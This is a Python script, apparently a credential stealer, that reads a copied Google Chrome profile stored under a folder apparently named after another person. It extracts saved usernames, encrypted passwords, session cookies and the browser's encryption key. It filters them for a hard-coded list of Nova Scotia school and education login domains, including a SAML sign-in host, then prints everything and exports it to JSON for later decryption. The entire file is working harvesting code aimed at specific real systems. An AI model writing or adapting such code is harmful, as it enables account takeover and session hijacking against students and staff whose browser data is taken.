#!/usr/bin/env python3
import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Paths to Chrome data files
CHROME_PATH = "/workspaces/JaiziahGreene/Lil samson bro/Local/Google/Chrome/User Data"
DEFAULT_PROFILE = os.path.join(CHROME_PATH, "Default")
LOGIN_DATA = os.path.join(DEFAULT_PROFILE, "Login Data")
COOKIES_DB = os.path.join(DEFAULT_PROFILE, "Network", "Cookies")
LOCAL_STATE = os.path.join(CHROME_PATH, "Local State")

# Target domains we're particularly interested in
TARGET_DOMAINS = [
    "sishrsb.ednet.ns.ca",
    "gnspes.ca",
    "everyone.ednet.ns.ca", 
    "saml.nspes.ca",
    "ednet.ns.ca",
    "nspes"
]

def get_chrome_key():
    """Get encryption key from Chrome's Local State file"""
    if not os.path.exists(LOCAL_STATE):
        print(f"Error: Local State file not found at {LOCAL_STATE}")
        return None
    
    try:
        with open(LOCAL_STATE, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
            
        # Retrieve the encrypted key
        encrypted_key = local_state['os_crypt']['encrypted_key']
        
        # Decode and remove 'DPAPI' prefix
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        
        print("Found encrypted Chrome key (b64):", base64.b64encode(encrypted_key).decode())
        print("Key cannot be decrypted without Windows DPAPI - we'll attempt to use it directly")
        
        return encrypted_key
    except Exception as e:
        print(f"Error getting encryption key: {e}")
        return None

def copy_db_for_access(db_path):
    """Create a temp copy of a database to avoid locks"""
    try:
        temp_dir = tempfile.mkdtemp()
        temp_db = os.path.join(temp_dir, "temp_db")
        shutil.copy2(db_path, temp_db)
        return temp_db, temp_dir
    except Exception as e:
        print(f"Error copying database {db_path}: {e}")
        return None, None

def cleanup(temp_db, temp_dir):
    """Clean up temporary files"""
    try:
        if temp_db and os.path.exists(temp_db):
            os.remove(temp_db)
        if temp_dir and os.path.exists(temp_dir):
            os.rmdir(temp_dir)
    except Exception as e:
        print(f"Error cleaning up: {e}")

def extract_login_data():
    """Extract login data from Chrome's Login Data database"""
    if not os.path.exists(LOGIN_DATA):
        print(f"Login Data database not found: {LOGIN_DATA}")
        return []
    
    temp_db, temp_dir = copy_db_for_access(LOGIN_DATA)
    if not temp_db:
        return []
    
    login_data = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Extract login data for target domains
        query = """
        SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used, date_password_modified
        FROM logins
        WHERE origin_url LIKE ? OR origin_url LIKE ? OR origin_url LIKE ?
        """
        
        for domain in TARGET_DOMAINS:
            cursor.execute(query, (f"%{domain}%", f"%.{domain}%", f"https://{domain}%"))
            
            for row in cursor.fetchall():
                origin_url, action_url, username, password_encrypted, date_created, date_last_used, date_modified = row
                
                # Convert timestamps (Chrome time format: microseconds since 1601-01-01 UTC)
                chrome_epoch = datetime(1601, 1, 1)
                
                # Creation date
                if date_created:
                    created_date = chrome_epoch + timedelta(microseconds=date_created)
                else:
                    created_date = None
                
                # Last used date
                if date_last_used:
                    last_used_date = chrome_epoch + timedelta(microseconds=date_last_used)
                else:
                    last_used_date = None
                
                # Password modified date
                if date_modified:
                    modified_date = chrome_epoch + timedelta(microseconds=date_modified)
                else:
                    modified_date = None
                
                login_data.append({
                    'origin_url': origin_url,
                    'action_url': action_url,
                    'username': username,
                    'password_encrypted': password_encrypted,  # Keep encrypted for now
                    'password_hex': password_encrypted.hex() if password_encrypted else None,
                    'created': str(created_date) if created_date else None,
                    'last_used': str(last_used_date) if last_used_date else None,
                    'modified': str(modified_date) if modified_date else None
                })
        
        conn.close()
    except Exception as e:
        print(f"Error extracting login data: {e}")
        try:
            conn.close()
        except:
            pass
    finally:
        cleanup(temp_db, temp_dir)
    
    return login_data

def extract_cookies():
    """Extract cookies from Chrome's Cookies database"""
    if not os.path.exists(COOKIES_DB):
        print(f"Cookies database not found: {COOKIES_DB}")
        return []
    
    temp_db, temp_dir = copy_db_for_access(COOKIES_DB)
    if not temp_db:
        return []
    
    cookies = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Extract cookies for target domains
        query = """
        SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, creation_utc, last_access_utc
        FROM cookies
        WHERE host_key LIKE ? OR host_key LIKE ?
        """
        
        for domain in TARGET_DOMAINS:
            cursor.execute(query, (f"%{domain}%", f"%.{domain}%"))
            
            for row in cursor.fetchall():
                host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, creation_utc, last_access_utc = row
                
                # Convert timestamps
                chrome_epoch = datetime(1601, 1, 1)
                
                if expires_utc:
                    expires_date = chrome_epoch + timedelta(microseconds=expires_utc)
                else:
                    expires_date = None
                
                creation_date = chrome_epoch + timedelta(microseconds=creation_utc)
                last_access_date = chrome_epoch + timedelta(microseconds=last_access_utc)
                
                # If value is empty but we have encrypted_value, we need to decrypt it
                if not value and encrypted_value:
                    # Keep the encrypted value for later decryption
                    value_to_use = ""
                else:
                    value_to_use = value
                
                cookies.append({
                    'host': host_key,
                    'name': name,
                    'value': value_to_use,
                    'encrypted_value': encrypted_value,
                    'encrypted_value_hex': encrypted_value.hex() if encrypted_value else None,
                    'path': path,
                    'expires': str(expires_date) if expires_date else 'Session',
                    'secure': bool(is_secure),
                    'httponly': bool(is_httponly),
                    'created': str(creation_date),
                    'last_accessed': str(last_access_date)
                })
        
        conn.close()
    except Exception as e:
        print(f"Error extracting cookies: {e}")
        try:
            conn.close()
        except:
            pass
    finally:
        cleanup(temp_db, temp_dir)
    
    return cookies

def export_data_to_json(data, filename):
    """Export data to JSON file"""
    try:
        # Convert bytes to hex strings for JSON serialization
        serializable_data = []
        for item in data:
            serializable_item = {}
            for key, value in item.items():
                if isinstance(value, bytes):
                    serializable_item[key] = value.hex()
                else:
                    serializable_item[key] = value
            serializable_data.append(serializable_item)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(serializable_data, f, indent=4)
        
        print(f"Data exported to {filename}")
    except Exception as e:
        print(f"Error exporting data to {filename}: {e}")

def main():
    print("===== Chrome Data Extractor =====")
    
    # Step 1: Get Chrome encryption key
    print("\n[1] Getting Chrome encryption key...")
    chrome_key = get_chrome_key()
    
    if not chrome_key:
        print("Failed to get Chrome encryption key. Continuing with encrypted data extraction only.")
    
    # Step 2: Extract login data
    print("\n[2] Extracting login data...")
    login_data = extract_login_data()
    
    if login_data:
        print(f"Found {len(login_data)} login entries")
        print("\n----- Login Data -----")
        for i, login in enumerate(login_data):
            print(f"{i+1}. URL: {login['origin_url']}")
            print(f"   Username: {login['username']}")
            print(f"   Password: [ENCRYPTED]")
            print(f"   Password (hex): {login['password_hex']}")
            print(f"   Created: {login['created']}")
            print(f"   Last Used: {login['last_used']}")
            print()
        
        # Export login data to JSON
        export_data_to_json(login_data, "exported_login_data.json")
    else:
        print("No login data found")
    
    # Step 3: Extract cookies
    print("\n[3] Extracting cookies...")
    cookies = extract_cookies()
    
    if cookies:
        print(f"Found {len(cookies)} cookies")
        print("\n----- Cookies -----")
        for i, cookie in enumerate(cookies):
            print(f"{i+1}. Domain: {cookie['host']}")
            print(f"   Name: {cookie['name']}")
            if cookie['value']:
                print(f"   Value: {cookie['value']}")
            else:
                print(f"   Value: [ENCRYPTED]")
                print(f"   Encrypted Value (hex): {cookie['encrypted_value_hex']}")
            print(f"   Path: {cookie['path']}")
            print(f"   Expires: {cookie['expires']}")
            print(f"   Secure: {cookie['secure']}")
            print(f"   HttpOnly: {cookie['httponly']}")
            print(f"   Created: {cookie['created']}")
            print(f"   Last Accessed: {cookie['last_accessed']}")
            print()
        
        # Export cookies to JSON
        export_data_to_json(cookies, "exported_cookies.json")
    else:
        print("No cookies found")

    print("\nData extraction complete. Note that password decryption requires Windows DPAPI which is not available in this environment.")
    print("The encrypted data has been exported to JSON files for further analysis.")

if __name__ == "__main__":
    main()
